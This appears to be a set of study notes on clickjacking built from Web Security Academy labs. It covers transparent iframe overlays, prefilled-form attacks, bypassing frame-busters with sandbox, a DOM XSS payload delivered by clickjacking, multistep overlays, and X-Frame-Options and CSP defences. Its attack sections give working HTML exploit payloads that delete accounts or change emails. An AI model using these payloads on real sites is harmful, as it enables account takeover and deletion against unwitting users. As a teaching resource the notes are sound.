![[Clickjacking.svg]]
# Clickjacking

Clickjacking tricks a user into clicking an action on a hidden site by clicking on some other content in a decoy website. Protections against CSRF attacks is often provided via a CSRF token; a session-specific, single-use number or nonce. 

Clickjacking is not mitigated by CSRF tokens since a target session is established with content loaded from an authentic site and with all requests happening on domain. CSRF tokens are passed to the server as part of a normal session.

Attacks use CSS to create and manipulate layers. It incorporates target sites as iframes layered on top. For example:

```html
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

Target iframe is positioned so there is an overlap of the target action with the decoy. Absolute and relative position values make sure the target site overlaps the decoy regardless of screen size, browser and platform. The `z-index` determines stacking order of iframe and web layers. 

Opacity value is defined as 0 so the iframe content is transparent to the user. 
# Recon

Identify if the app's responses contain the following headers:

- X-Frame-Options: value
- Content-Security-Policy: frame-ancestors value

If the responses do not contain these headers, then the app is most likely vulnerable to clickjacking.
# Basic Clickjacking

After logging into an account, there may be a dangerous button such as "Delete Account". An iframe could be crafted that places a div over the button, enticing the user to click on the button, where the account is actually deleted on the main page. 

For example, it could look like:

```html
<style>
    iframe {
        position:relative;
        width:900px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:495px;
        left:65px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a1c0087030dc9d9801ec16800fa0000.web-security-academy.net/my-account"></iframe>
```

The button should appear to be over the functionality the user will click such as:

![[Basic Clickjacking.png]]

Try delivering to the victim to make them delete their account.
# Clickbandit

When testing for clickjacking, try using Burp's Clickbandit tool which lets you use your browser to perform the desired actions on the frameable page, then creates an HTML page containing a suitable clickjacking overlay. It is used to generate a PoC in seconds.
# Clickjacking with Prefilled Form Input

Some sites that require form completion and submission permit prepopulating of form inputs using GET parameters before submission. Some sites may also require text before form submission. Since GET values are in the URL, the target URL can be modified to use values of your choosing and the transparent button is overlaid on the decoy site.

For example, after logging in there may be an option to change the email. Try checking the name of the input field such as `email` and submitting it as a GET request and check if prepopulation happens:

```html
?email=blah@blah.com
```

If it pre-populates, an iframe can be crafted to pre-fill and then click the update email button:

```html
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a85008e03dfa41585b480da00b3004a.web-security-academy.net/my-account?email=blah@blah.com"></iframe>
```
# Frame Busting Scripts

A common protection is using frame busting or frame breaking scripts which are implemented via proprietary browser JavaScript add-ons or extensions like NoScript. Scripts may do all or some of the following:

- check and enforce the current app window is the main or top window
- make all frames visible
- prevent clicking on invisible frames
- intercept and flag potential clickjacking attacks to the user

They are often browser/platform specific. They can usually be circumvented. Since they are JavaScript, the browser security settings may prevent their operation or the browser might not even support JavaScript. An effective workaround is using the HTML5 iframe `sandbox` attribute.

When set with `allow-forms` or `allow-scripts` values and the `allow-top-navigation` is left out, the frame busting script is neutralized as the iframe cannot check if it is the top window such as:

```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

The `allow-forms` and `allow-scripts` permit the specified actions within the `iframe` but top-level navigation is disabled.

For example, an update email button may exist which can be prepopulated. Try crafting an exploit with the iframe values specified above:

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Clickme</div>
<iframe sandbox="allow-forms"
src="https://0a68006004c8da1682001506006e00db.web-security-academy.net/my-account?email=victim@pwned.com"></iframe>
```
# Clickjacking with DOM XSS Attack

Clickjacking can be used as a carrier for another attack such as a DOM XSS attack. Implementation is straightforward assuming the XSS exploit has been identified already. The XSS exploit is combined with an iframe target URL so the user clicks on the button/link and executes the attack.

For example, there may be a feedback form. Try filling it out with appropriate values. It may reflect the name parameter back onto the page as a thank you message. in a span element:

```html
<span id="feedbackResult">Thank you for submitting feedback, Name!</span>
```

Try performing a DOM based attack by inserting a basic payload:

```html
<img src=0 onerror=alert(1)>
```

If execution occurs, create an iframe with the DOM based exploit with a prepopulated field (i.e. `name`, `subject`, `email`, `message`) so a GET request can be crafted:

```html
<style>
	iframe {
		position:relative;
		width:1200px;
		height: 1000px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top: 834px;
		left: 80px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0af8001e03ad307880dd992b000a002f.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=fuckyou@bitch.com&subject=test&message=test"></iframe>
```
# Multistep Clickjacking

Manipulation of inputs may require multiple actions. An attacker may want to trick a user to buy something so items need to be added to a basket before the order is placed. The actions can be implemented by using multiple divisions or iframes.

For example, when deleting the account, there may be an extra step asking for confirmation. In that case, an iframe with two clicks could be created such as:

```html
<style>
	iframe {
		position:relative;
		width: 800px;
		height: 600px;
		opacity: 0.0000001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top: 499px;
		left: 60px;
		z-index: 1;
	}
   .secondClick {
		top: 299px;
		left: 220px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a2900ac04e212198035537800f10083.web-security-academy.net/my-account"></iframe>
```
# X-Frame-Options

This header provides website owners control over the use of iframes and objects so that inclusion of a web page within a frame can be prohibited with the `deny` directive:

- X-Frame-Options: deny

Framing can be restricted to the same origin as the website:

- X-Frame-Options: sameorigin

Or to a named website using the `allow-from` directive:

- X-Frame-Options: allow-from https\://normal-website.com

>[!info]
>It is not implemented consistently across browsers as the `allow-from` directive is not supported in Chrome version 76 or Safari 12. 
# Content-Security-Policy

CSP is a detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking. CSP is usually implemented in the server as a return header of the form:

- Content-Security-Policy: policy

The policy is a string of directives separated by semicolons. It provides the browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviours.

Recommended protection is to incorporate `frame-ancestors 'none'` directive which is similiar to X-Frame-Options deny option. The `'self'` directive is equivalent to the X-Frame-Options `sameorigin` directive. The following whitelists frames to the same domain only:

```html
Content-Security-Policy: frame-ancestors 'self';
```

Or framing could be restricted to named sites:

```html
Content-Security-Policy: frame-ancestors normal-website.com;
```

